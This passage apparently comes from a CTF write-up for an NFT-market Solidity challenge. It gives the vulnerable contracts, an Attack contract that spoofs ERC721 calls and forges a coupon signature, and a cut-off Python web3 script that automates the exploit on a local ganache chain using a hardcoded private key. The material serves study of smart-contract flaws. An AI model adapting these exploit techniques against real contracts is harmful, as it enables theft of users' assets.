class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity 0.8.15;</span><br><span class="line"></span><br><span class="line">import &quot;./openzeppelin-contracts/contracts/token/ERC721/ERC721.sol&quot;;</span><br><span class="line">import &quot;./openzeppelin-contracts/contracts/token/ERC20/ERC20.sol&quot;;</span><br><span class="line">import &quot;./openzeppelin-contracts/contracts/access/Ownable.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract TctfNFT is ERC721, Ownable &#123;</span><br><span class="line">    constructor() ERC721(&quot;TctfNFT&quot;, &quot;TNFT&quot;) &#123;</span><br><span class="line">        _setApprovalForAll(address(this), msg.sender, true);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function mint(address to, uint256 tokenId) external onlyOwner &#123;</span><br><span class="line">        _mint(to, tokenId);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TctfToken is ERC20 &#123;</span><br><span class="line">    bool airdropped;</span><br><span class="line"></span><br><span class="line">    constructor() ERC20(&quot;TctfToken&quot;, &quot;TTK&quot;) &#123;</span><br><span class="line">        _mint(address(this), 100000000000);</span><br><span class="line">        _mint(msg.sender, 1337);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function airdrop() external &#123;</span><br><span class="line">        require(!airdropped, &quot;Already airdropped&quot;);</span><br><span class="line">        airdropped = true;</span><br><span class="line">        _mint(msg.sender, 5);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct Order &#123;</span><br><span class="line">    address nftAddress;</span><br><span class="line">    uint256 tokenId;</span><br><span class="line">    uint256 price;</span><br><span class="line">&#125;</span><br><span class="line">struct Coupon &#123;</span><br><span class="line">    uint256 orderId;</span><br><span class="line">    uint256 newprice;</span><br><span class="line">    address issuer;</span><br><span class="line">    address user;</span><br><span class="line">    bytes reason;</span><br><span class="line">&#125;</span><br><span class="line">struct Signature &#123;</span><br><span class="line">    uint8 v;</span><br><span class="line">    bytes32[2] rs;</span><br><span class="line">&#125;</span><br><span class="line">struct SignedCoupon &#123;</span><br><span class="line">    Coupon coupon;</span><br><span class="line">    Signature signature;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract TctfMarket &#123;</span><br><span class="line">    event SendFlag();</span><br><span class="line">    event NFTListed(</span><br><span class="line">        address indexed seller,</span><br><span class="line">        address indexed nftAddress,</span><br><span class="line">        uint256 indexed tokenId,</span><br><span class="line">        uint256 price</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    event NFTCanceled(</span><br><span class="line">        address indexed seller,</span><br><span class="line">        address indexed nftAddress,</span><br><span class="line">        uint256 indexed tokenId</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    event NFTBought(</span><br><span class="line">        address indexed buyer,</span><br><span class="line">        address indexed nftAddress,</span><br><span class="line">        uint256 indexed tokenId,</span><br><span class="line">        uint256 price</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    bool tested;</span><br><span class="line">    TctfNFT public tctfNFT;</span><br><span class="line">    TctfToken public tctfToken;</span><br><span class="line">    CouponVerifierBeta public verifier;</span><br><span class="line">    Order[] orders;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        tctfToken = new TctfToken();</span><br><span class="line">        tctfToken.approve(address(this), type(uint256).max);</span><br><span class="line"></span><br><span class="line">        tctfNFT = new TctfNFT();</span><br><span class="line">        tctfNFT.mint(address(tctfNFT), 1);</span><br><span class="line">        tctfNFT.mint(address(this), 2);</span><br><span class="line">        tctfNFT.mint(address(this), 3);</span><br><span class="line"></span><br><span class="line">        verifier = new CouponVerifierBeta();</span><br><span class="line"></span><br><span class="line">        orders.push(Order(address(tctfNFT), 1, 1));</span><br><span class="line">        orders.push(Order(address(tctfNFT), 2, 1337));</span><br><span class="line">        orders.push(Order(address(tctfNFT), 3, 13333333337));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getOrder(uint256 orderId) public view returns (Order memory order) &#123;</span><br><span class="line">        require(orderId &lt; orders.length, &quot;Invalid orderId&quot;);</span><br><span class="line">        order = orders[orderId];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function createOrder(address nftAddress, uint256 tokenId, uint256 price) external returns(uint256) &#123;</span><br><span class="line">        require(price &gt; 0, &quot;Invalid price&quot;);</span><br><span class="line">        require(isNFTApprovedOrOwner(nftAddress, msg.sender, tokenId), &quot;Not owner&quot;);</span><br><span class="line">        orders.push(Order(nftAddress, tokenId, price));</span><br><span class="line">        emit NFTListed(msg.sender, nftAddress, tokenId, price);</span><br><span class="line">        return orders.length - 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function cancelOrder(uint256 orderId) external &#123;</span><br><span class="line">        Order memory order = getOrder(orderId);</span><br><span class="line">        require(isNFTApprovedOrOwner(order.nftAddress, msg.sender, order.tokenId), &quot;Not owner&quot;);</span><br><span class="line">        _deleteOrder(orderId);</span><br><span class="line">        emit NFTCanceled(msg.sender, order.nftAddress, order.tokenId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function purchaseOrder(uint256 orderId) external &#123;</span><br><span class="line">        Order memory order = getOrder(orderId);</span><br><span class="line">        _deleteOrder(orderId);</span><br><span class="line">        IERC721 nft = IERC721(order.nftAddress);</span><br><span class="line">        address owner = nft.ownerOf(order.tokenId);</span><br><span class="line">        tctfToken.transferFrom(msg.sender, owner, order.price);</span><br><span class="line">        nft.safeTransferFrom(owner, msg.sender, order.tokenId);</span><br><span class="line">        emit NFTBought(msg.sender, order.nftAddress, order.tokenId, order.price);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function purchaseWithCoupon(SignedCoupon calldata scoupon) external &#123;</span><br><span class="line">        Coupon memory coupon = scoupon.coupon;</span><br><span class="line">        require(coupon.user == msg.sender, &quot;Invalid user&quot;);</span><br><span class="line">        require(coupon.newprice &gt; 0, &quot;Invalid price&quot;);</span><br><span class="line">        verifier.verifyCoupon(scoupon);</span><br><span class="line">        Order memory order = getOrder(coupon.orderId);</span><br><span class="line">        _deleteOrder(coupon.orderId);</span><br><span class="line">        IERC721 nft = IERC721(order.nftAddress);</span><br><span class="line">        address owner = nft.ownerOf(order.tokenId);</span><br><span class="line">        tctfToken.transferFrom(coupon.user, owner, coupon.newprice);</span><br><span class="line">        nft.safeTransferFrom(owner, coupon.user, order.tokenId);</span><br><span class="line">        emit NFTBought(coupon.user, order.nftAddress, order.tokenId, coupon.newprice);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function purchaseTest(address nftAddress, uint256 tokenId, uint256 price) external &#123;</span><br><span class="line">        require(!tested, &quot;Tested&quot;);</span><br><span class="line">        tested = true;</span><br><span class="line">        IERC721 nft = IERC721(nftAddress);</span><br><span class="line">        uint256 orderId = TctfMarket(this).createOrder(nftAddress, tokenId, price);</span><br><span class="line">        nft.approve(address(this), tokenId);</span><br><span class="line">        TctfMarket(this).purchaseOrder(orderId);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function win() external &#123;</span><br><span class="line">        require(tctfNFT.ownerOf(1) == msg.sender &amp;&amp; tctfNFT.ownerOf(2) == msg.sender &amp;&amp; tctfNFT.ownerOf(3) == msg.sender);</span><br><span class="line">        emit SendFlag();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isNFTApprovedOrOwner(address nftAddress, address spender, uint256 tokenId) internal view returns (bool) &#123;</span><br><span class="line">        IERC721 nft = IERC721(nftAddress);</span><br><span class="line">        address owner = nft.ownerOf(tokenId);</span><br><span class="line">        return (spender == owner || nft.isApprovedForAll(owner, spender) || nft.getApproved(tokenId) == spender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function _deleteOrder(uint256 orderId) internal &#123;</span><br><span class="line">        orders[orderId] = orders[orders.length - 1];</span><br><span class="line">        orders.pop();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) &#123;</span><br><span class="line">        return this.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract CouponVerifierBeta &#123;</span><br><span class="line">    TctfMarket market;</span><br><span class="line">    bool tested;</span><br><span class="line"></span><br><span class="line">    constructor() &#123;</span><br><span class="line">        market = TctfMarket(msg.sender);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function verifyCoupon(SignedCoupon calldata scoupon) public &#123;</span><br><span class="line">        require(!tested, &quot;Tested&quot;);</span><br><span class="line">        tested = true;</span><br><span class="line">        Coupon memory coupon = scoupon.coupon;</span><br><span class="line">        Signature memory sig = scoupon.signature;</span><br><span class="line">        Order memory order = market.getOrder(coupon.orderId);</span><br><span class="line">        bytes memory serialized = abi.encode(</span><br><span class="line">            &quot;I, the issuer&quot;, coupon.issuer,</span><br><span class="line">            &quot;offer a special discount for&quot;, coupon.user,</span><br><span class="line">            &quot;to buy&quot;, order, &quot;at&quot;, coupon.newprice,</span><br><span class="line">            &quot;because&quot;, coupon.reason</span><br><span class="line">        );</span><br><span class="line">        IERC721 nft = IERC721(order.nftAddress);</span><br><span class="line">        address owner = nft.ownerOf(order.tokenId);</span><br><span class="line">        require(coupon.issuer == owner, &quot;Invalid issuer&quot;);</span><br><span class="line">        require(ecrecover(keccak256(serialized), sig.v, sig.rs[0], sig.rs[1]) == coupon.issuer, &quot;Invalid signature&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract AA &#123;</span><br><span class="line">    </span><br><span class="line">    address issuer;</span><br><span class="line">    address user;</span><br><span class="line">    uint256 newprice;</span><br><span class="line">    bytes reason;</span><br><span class="line">    Order order;</span><br><span class="line">    bytes32 public hashl;</span><br><span class="line"></span><br><span class="line">    function setinit(address _issuer, address _user, uint _newprice, address _nftaddress, uint _price, uint _tokenId) public &#123;</span><br><span class="line">        issuer = _issuer;</span><br><span class="line">        user = _user;</span><br><span class="line">        newprice = _newprice;</span><br><span class="line">        order.nftAddress = _nftaddress;</span><br><span class="line">        order.price = _price;</span><br><span class="line">        order.tokenId = _tokenId;</span><br><span class="line"></span><br><span class="line">        bytes memory serialized = abi.encode(</span><br><span class="line">            &quot;I, the issuer&quot;, issuer,</span><br><span class="line">            &quot;offer a special discount for&quot;, user,</span><br><span class="line">            &quot;to buy&quot;, order, &quot;at&quot;, newprice,</span><br><span class="line">            &quot;because&quot;, &quot;&quot;</span><br><span class="line">        );</span><br><span class="line">        hashl = keccak256(serialized);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract Attack &#123;</span><br><span class="line"></span><br><span class="line">    TctfMarket T = TctfMarket(0x21df4c1E0F1f114A136DA168E33e9Dfbd005FA45);</span><br><span class="line">    address account=0x80C86B253647868C927dc8442143B880203BC397;</span><br><span class="line">    TctfNFT N= TctfNFT(address(T.tctfNFT())); </span><br><span class="line">    TctfToken Token=TctfToken(T.tctfToken());</span><br><span class="line"></span><br><span class="line">    function approve(address a,uint b) public &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    function safeTransferFrom(address a,address b,uint c) public &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function ownerOf(uint dd) public returns (address)&#123;</span><br><span class="line"></span><br><span class="line">        if(dd==2)&#123;</span><br><span class="line">            return address(this);</span><br><span class="line">        &#125;else if(dd==3)&#123;</span><br><span class="line">            return address(account);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isApprovedForAll(address a,address b) public returns (bool)&#123;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getApproved(uint tokenId) public returns (address)&#123;</span><br><span class="line">        return address(this);</span><br><span class="line">    &#125;</span><br><span class="line">    function  attack1() public &#123;</span><br><span class="line">        T.purchaseTest(address(this),2,1337);</span><br><span class="line">        Token.transfer(account,1337);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attackfor3(uint8 v, bytes32 r, bytes32 s) public &#123;</span><br><span class="line">        SignedCoupon memory scoupon;</span><br><span class="line">        N.setApprovalForAll(account,true);</span><br><span class="line">        Token.approve(address(0x21df4c1E0F1f114A136DA168E33e9Dfbd005FA45),10);</span><br><span class="line">        scoupon.coupon.orderId=1;</span><br><span class="line">        scoupon.coupon.newprice=1;</span><br><span class="line">        scoupon.coupon.issuer=address(account);</span><br><span class="line">        scoupon.coupon.user=address(this);</span><br><span class="line">        scoupon.coupon.reason=&quot;&quot;;</span><br><span class="line">        scoupon.signature.v=v;</span><br><span class="line">        scoupon.signature.rs[0]=r; </span><br><span class="line">        scoupon.signature.rs[1]=s;</span><br><span class="line">        T.purchaseWithCoupon&#123;gas:200000&#125;(scoupon);</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function attack4() public &#123;</span><br><span class="line">        N.setApprovalForAll(account,true);</span><br><span class="line">        N.transferFrom(address(this),address(account),3);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    function onERC721Received(address, address, uint256, bytes memory) public pure returns (bytes4) &#123;</span><br><span class="line">        return this.onERC721Received.selector;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>python 自动化一键运行，环境为本地 ganache 测试环境</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line">from web3 import Web3, HTTPProvider</span><br><span class="line">from solcx import compile_source,set_solc_version_pragma,compile_files</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line">w3 = Web3(Web3.HTTPProvider(&apos;http://127.0.0.1:8545&apos;))</span><br><span class="line"></span><br><span class="line">private = &quot;199280a1c26810629f63269567b0aa1ee11c52bdaf16cf5526d0f4f3aadb65fb&quot;</span><br><span class="line">public = &quot;0x2482119eBcDb9659397A0c1c59ed948fae80d47F&quot;</span><br><span class="line"></span><br><span class="line">_time = 1</span><br><span class="line"></span><br><span class="line">set_solc_version_pragma(&apos;^0.8.15&apos;)</span><br><span class="line">chain_id = w3.eth.chain_id</span><br><span class="line"></span><br><span class="line">def generate_tx(chainID, to, data, value):</span><br><span class="line">    txn = &#123;</span><br><span class="line">        &apos;chainId&apos;: chainID,</span><br><span class="line">        &apos;from&apos;: Web3.toChecksumAddress(public),</span><br><span class="line">        &apos;to&apos;: to,</span><br><span class="line">        &apos;gasPrice&apos;: w3.eth.gasPrice,</span><br><span class="line">        &apos;gas&apos;: 10000000,</span><br><span class="line">        &apos;nonce&apos;: w3.eth.getTransactionCount(Web3.toChecksumAddress(public)),</span><br><span class="line">        &apos;value&apos;: Web3.toWei(value, &apos;ether&apos;),</span><br><span class="line">        &apos;data&apos;: data,</span><br><span class="line">    &#125;</span><br><span class="line">    return txn</span><br><span class="line"></span><br><span class="line">def sign_and_send(txn):</span><br><span class="line">    signed_txn = w3.eth.account.signTransaction(txn, private)</span><br><span class="line">    txn_hash = w3.eth.sendRawTransaction(signed_txn.rawTransaction).hex()</span><br><span class="line">    txn_receipt = w3.eth.waitForTransactionReceipt(txn_hash)</span><br><span class="line">    print(&quot;txn_hash=&quot;, txn_hash)</span><br><span class="line">    return txn_receipt</span><br><span class="line"></span><br><span class="line">def deploy_eth():</span><br><span class="line">    compiled_sol = compile_files([&quot;eth.sol&quot;],output_values=[&quot;abi&quot;, &quot;bin&quot;],solc_version=&quot;0.8.15&quot;)</span><br><span class="line"></span><br><span class="line">    data = compiled_sol[&apos;eth.sol:TctfMarket&apos;][&apos;bin&apos;]</span><br><span class="line">    abi = compiled_sol[&apos;eth.sol:TctfMarket&apos;][&apos;abi&apos;]</span><br><span class="line">    abi_TctfNFT = compiled_sol[&apos;eth.sol:TctfNFT&apos;][&apos;abi&apos;]</span><br><span class="line">    txn = generate_tx(chain_id, &apos;&apos;, data, 0)</span><br><span class="line">    txn_receipt = sign_and_send(txn)</span><br><span class="line">    if txn_receipt[&apos;status&apos;] == 1:</span><br><span class="line">        TctfMarket_address = txn_receipt[&apos;contractAddress&apos;]</span><br><span class="line">        return TctfMarket_address,abi,abi_TctfNFT</span><br><span class="line">    else:</span><br><span class="line">        exit(0)</span><br><span class="line"></span><br><span class="line">def copy_attack(_TctfMarket):</span><br><span class="line">    with open(&apos;attack_bk.sol&apos;, &apos;r&apos;) as f:</span><br><span class="line">        ff = f.read()</span><br><span class="line">        ff = ff.replace(&apos;0x21df4c1E0F1f114A136DA168E33e9Dfbd005FA45&apos; , _TctfMarket)</span><br><span class="line">        ff = ff.replace(&apos;0x80C86B253647868C927dc8442143B880203BC397&apos; , public)</span><br><span class="line">        with open(&apos;attack.sol&apos;, &apos;w&apos;) as g:</span><br><span class="line">            g.write(ff)</span><br><span class="line"></span><br><span class="line">def deploy_attack():</span><br><span class="line">    compiled_sol = compile_files([&quot;attack.sol&quot;],output_values=[&quot;abi&quot;, &quot;bin&quot;],solc_version=&quot;0.8.15&quot;)</span><br><span class="line"></span><br><span class="line">    data = compiled_sol[&apos;attack.sol:Attack&apos;][&apos;bin&apos;]</span><br><span class="line">    txn = generate_tx(chain_id, &apos;&apos;, data, 0)</span><br><span class="line">    txn_receipt = sign_and_send(txn)</span><br><span class="line">    if txn_receipt[&apos;status&apos;] == 1:</span><br><span class="line">        attack_address = txn_receipt[&apos;contractAddress&apos;]</span><br><span class="line">        return attack_address</span><br><span class="line">    else:</span><br><span class="line">        exit(0)</span><br><span class="line"></span><br><span class="line">def deploy_AA():</span><br><span class="line">    compiled_sol = compile_files([&quot;attack.sol&quot;],output_values=[&quot;abi&quot;, &quot;bin&quot;],solc_version=&quot;0.8.15&quot;)</span><br><span class="line"></span><br><span class="line">    data = compiled_sol[&apos;attack.sol:AA&apos;][&apos;bin&apos;]</span><br><span class="line">    abi = compiled_sol[&apos;attack.sol:AA&apos;][&apos;abi&apos;]</span><br><span class="line">    txn = generate_tx(chain_id, &apos;&apos;, data, 0)</span><br><span class="line">    txn_receipt = sign_and_send(txn)</span><br><span class="line">    if txn_receipt[&apos;status&apos;] == 1:</span><br><span class="line">        AA_address = txn_receipt[&apos;contractAddress&apos;]</span><br><span class="line">        return AA_address,abi</span><br><span class="line">    else:</span><br><span class="line">        exit(0)</span><br><span class="line"></span><br><span class="line">def rsv(_hash):</span><br><span class="line">    signed_message = w3.eth.account.signHash(_hash, private)</span><br><span class="line">    print(signed_message.messageHash.hex())</span><br><span class="line">    r = &apos;0x&apos;+signed_message.signature.hex()[2:66]</span><br><span class="line">    s = &apos;0x&apos;+signed_message.signature.hex()[66:-2]</span><br><span class="line">    v = &apos;0x&apos;+signed_message.signature.hex()[-2:]</span><br><span class="line">    return r,s,v</span><br><span class="line"></span><br><span class="line">TctfMarket_address,abi,abi_TctfNFT = deploy_eth()</span><br><span class="line">print(&apos;TctfMarket_address =&apos;,TctfMarket_address)</span><br><span class="line"># TctfMarket_address = &quot;0x1d5f96A512a946c5C2A729f8155CCBb7bbBb3f3B&quot;</span><br><span class="line">contract = w3.eth.contract(abi = abi, address = TctfMarket_address)</span><br><span class="line"></span><br><span class="line">tctfNFT_address = contract.functions.tctfNFT().call()</span><br><span class="line">print(&apos;tctfNFT_address =&apos;,tctfNFT_address)</span><br><span class="line">tctfToken_address = contract.functions.tctfToken().call()</span><br><span class="line">print(&apos;tctfToken_address =&apos;,tctfToken_address)</span><br><span class="line">verifier_address = contract.functions.verifier().call()</span><br><span class="line">print(&apos;verifier_address =&apos;,verifier_address)</span><br><span class="line"></span><br><span class="line">TctfNFT_contract = w3.eth.contract(abi = abi_TctfNFT, address = tctfNFT_address)</span><br><span class="line"></span><br><span class="line">copy_attack(TctfMarket_address)</span><br><span class="line"></span><br><span class="line">attack_address = deploy_attack()</span><br><span class="line">print(&apos;attack_address =&apos;,attack_address)</span><br><span class="line"></span><br><span class="line">AA_address,abi = deploy_AA()</span><br><span class="line">print(&apos;AA_address =&apos;,AA_address)</span><br><span class="line">AA_contract = w3.eth.contract(abi = abi, address = AA_address)</span><br><span class="line"></span><br><span class="line">data = Web3.keccak(text=&apos;setinit(address,address,uint256,address,uint256,uint256)&apos;).hex()[:10]</span><br><span class="line">data += public[2:].rjust(64, &apos;0&apos;)</span><br><span class="line">data += attack_address[2:].rjust(64, &apos;0&apos;)</span><br><span class="line">data += &apos;1&apos;.rjust(64, &apos;0&apos;)</span><br><span class="line">data += attack_address[2:].rjust(64, &apos;0&apos;)</span><br><span class="line">data += &apos;1&apos;.rjust(64, &apos;0&apos;)</span><br><span class="line">data += &apos;3&apos;.rjust(64, &apos;0&apos;)</span><br><span class="line">txn = generate_tx(chain_id, Web3.toChecksumAddress(AA_address), data, 0)</span><br><span class="line">txn_receipt = sign_and_send(txn)</span><br><span class="line">if txn_receipt[&apos;status&apos;] == 1:</span><br><span class="line">    print(&apos;setinit(eoa,attack_address,1,attack_address,1,3) success&apos;)</span><br><span class="line">else:</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">time.sleep(_time)</span><br><span class="line"></span><br><span class="line">hashl = AA_contract.functions.hashl().call()</span><br><span class="line">r,s,v = rsv(hashl)</span><br><span class="line">print(&apos;r =&apos;,r)</span><br><span class="line">print(&apos;s =&apos;,s)</span><br><span class="line">print(&apos;v =&apos;,v)</span><br><span class="line"></span><br><span class="line">data = Web3.keccak(text=&apos;attack1()&apos;).hex()[:10]</span><br><span class="line">txn = generate_tx(chain_id, 